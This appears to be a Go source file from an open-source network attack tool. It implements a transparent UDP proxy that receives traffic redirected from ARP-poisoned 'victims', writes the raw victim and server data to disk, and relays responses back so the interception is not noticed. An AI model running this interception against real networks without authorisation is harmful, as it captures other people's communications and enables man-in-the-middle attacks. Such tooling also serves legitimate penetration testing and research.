package proxy

import (
	"context"
	"errors"
	"fmt"
	"github.com/impostorkeanu/eavesarp-ng/misc"
	"go.uber.org/zap"
	"io"
	"net"
	"time"
)

// NOTE: These types are written to be reasonably consistent
// with TCPServer, which uses gosplit.Proxy.

type (
	UDPCfg struct {
		// downstreams is a mapping of source misc.Addr to downstream net.IP
		// instances.
		//
		// Records found here are set by eavesarp_ng.AttackSnac while
		// poisoning victims.
		downstreams   misc.Downstreams
		defDownstream *string
		log           *zap.Logger // for log events
		dataW         io.Writer   // for writing misc.AttackData records
	}

	// UDPServer is a UDP proxy capable of relaying UDP packets to downstreams
	// while intercepting and writing all data to disk.
	UDPServer struct {
		Cfg  UDPCfg
		conn *net.UDPConn
	}
)

func NewUDPCfg(downstreams misc.Downstreams, defDownstream *string, log *zap.Logger, dataW io.Writer) UDPCfg {
	return UDPCfg{
		downstreams:   downstreams,
		defDownstream: defDownstream,
		log:           log,
		dataW:         dataW,
	}
}

func NewUDPServer(cfg UDPCfg, conn *net.UDPConn) *UDPServer {
	return &UDPServer{
		Cfg:  cfg,
		conn: conn,
	}
}

func (s *UDPServer) Serve(ctx context.Context) (err error) {
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			//=====================
			// WAIT FOR UDP TRAFFIC
			//=====================

			var e error
			var n int
			var addr *net.UDPAddr

			// read value larger than the average mtu
			buf := make([]byte, 2048)
			n, addr, e = s.conn.ReadFromUDP(buf)
			if e != nil && errors.Is(e, net.ErrClosed) {
				// listener should be closed only when the context is done
				continue
			} else if e != nil {
				s.Cfg.log.Error("unhandled error while handling udp packet", zap.Error(e))
				continue
			}

			//====================================
			// GET ADDRESS INFORMATION FOR LOGGING
			//====================================

			var (
				pAddrInf misc.Addr // proxy address info
				vAddrInf misc.Addr // victim address info
				tAddrInf misc.Addr // target address info
			)

			// proxy
			// TODO tproxy update will break this....localaddr is now the real address
			//   being requested
			if pAddrInf, e = misc.NewAddr(s.conn.LocalAddr(), "udp"); e != nil {
				s.Cfg.log.Error("unhandled error while getting proxy address for udp packet", zap.Error(e))
				continue
			}

			if vAddrInf, e = misc.NewAddr(addr, "udp"); e != nil {
				s.Cfg.log.Error("failed to parse udp address while handling udp packet", zap.Error(e))
				continue
			}

			// NOTE: since we're using TPROXY, the connection's local address
			// is the ARP target
			if i, p, e := net.SplitHostPort(s.conn.LocalAddr().String()); e != nil {
				s.Cfg.log.Error("failed to parse local address while handling udp packet", zap.Error(e))
				continue
			} else {
				tAddrInf = misc.Addr{
					IP:        i,
					Port:      p,
					Transport: misc.UDPTransport,
				}
			}

			//=======================
			// GET DOWNSTREAM ADDRESS
			//=======================

			var dsAddrInf *misc.Addr // downstream address
			if v := s.Cfg.downstreams.Load(vAddrInf.IP, tAddrInf.IP); v != nil {
				// got the downstream based on the victim and original destination
				dsAddrInf = v
				v.Transport = misc.UDPTransport
				v.Port = tAddrInf.Port
			} else if s.Cfg.defDownstream != nil {
				// using default downstream
				dsAddrInf = &misc.Addr{
					IP:        *s.Cfg.defDownstream,
					Port:      tAddrInf.Port,
					Transport: misc.UDPTransport,
				}
			}

			//================
			// LOG VICTIM DATA
			//================

			lData := misc.AttackData{
				Sender:         misc.VictimDataSender,
				ProxyAddr:      pAddrInf,
				DownstreamAddr: dsAddrInf,
				Transport:      misc.UDPTransport,
				Raw:            buf[:n],
			}

			if a, p, err := net.SplitHostPort(s.conn.LocalAddr().String()); err != nil {
				err = fmt.Errorf("failed to parse local address while handling udp packet: %w", err)
				s.Cfg.log.Error(err.Error(), zap.Error(err))
				return err
			} else {
				lData.VictimAddr, lData.SpoofedAddr = misc.NewVicSpoofedAddr(vAddrInf.IP, vAddrInf.Port, a, p, misc.UDPTransport)
			}

			if n > 0 {
				s.writeData(lData)
			}

			//===========================================
			// SEND TO DOWNSTREAM AND WAIT FOR A RESPONSE
			//===========================================

			if dsAddrInf == nil {
				continue
			}

			// - dsUDPAddr is the downstream address that packets are being proxied to
			// - vUDPAddr is the victim address that will receive datagrams from the downstream
			//   after proxying
			var dsUDPAddr, vUDPAddr *net.UDPAddr
			if dsUDPAddr, e = net.ResolveUDPAddr("udp4", dsAddrInf.String()); e != nil {
				s.Cfg.log.Error("failed to resolve udp address for downstream", zap.Error(e))
				continue
			} else if vUDPAddr, e = net.ResolveUDPAddr("udp4", vAddrInf.String()); e != nil {
				s.Cfg.log.Error("failed to resolve udp address for victim", zap.Error(e))
				continue
			}

			// downstream connection
			var dsUDPConn *net.UDPConn
			if dsUDPConn, e = net.DialUDP("udp4", nil, dsUDPAddr); e != nil {
				s.Cfg.log.Error("failed to dial udp for downstream", zap.Error(e))
				continue
			}

			// proxy to downstream and receive any response
			go func() {
				defer dsUDPConn.Close()
				if _, err := dsUDPConn.Write(buf[:n]); err != nil {
					s.Cfg.log.Error("failed to send udp packet to downstream", zap.Error(err))
					return
				}

				// wait for and receive any downstream response to the datagram
				if e = dsUDPConn.SetReadDeadline(time.Now().Add(5 * time.Second)); e != nil {
					s.Cfg.log.Error("failed to set read deadline while reading udp data", zap.Error(e))
					return
				}
				buf := make([]byte, 2048)
				n, e = dsUDPConn.Read(buf)
				if e != nil {
					s.Cfg.log.Error("failed to read udp packet from downstream", zap.Error(e))
					return
				}

				// reuse old data structure to log data
				lData.Data = ""
				lData.Raw = buf[:n]
				lData.Sender = misc.DownstreamDataSender
				s.writeData(lData)

				// send the downstream response back to the victim via the
				// servers connection
				if e = dsUDPConn.SetWriteDeadline(time.Now().Add(5 * time.Second)); e != nil {
					s.Cfg.log.Error("failed to set write deadline while sending udp data", zap.Error(e))
					return
				}
				_, e = s.conn.WriteToUDP(buf[:n], vUDPAddr)
				if e != nil {
					s.Cfg.log.Error("unhandled eor while sending udp packet",
						zap.Error(e),
						zap.Any("source", vAddrInf),
						zap.Any("destination", dsAddrInf))
					return
				}
			}()
		}
	}
}

// writeData sends data to the data writer so long
// as it's not nil.
func (s *UDPServer) writeData(lData misc.AttackData) {
	if s.Cfg.dataW == nil || len(lData.Raw) == 0 {
		return
	}
	// log data sent by victim
	if e := lData.Log(s.Cfg.dataW); e != nil {
		s.Cfg.log.Error("failed to write udp data", zap.Error(e))
	}
}
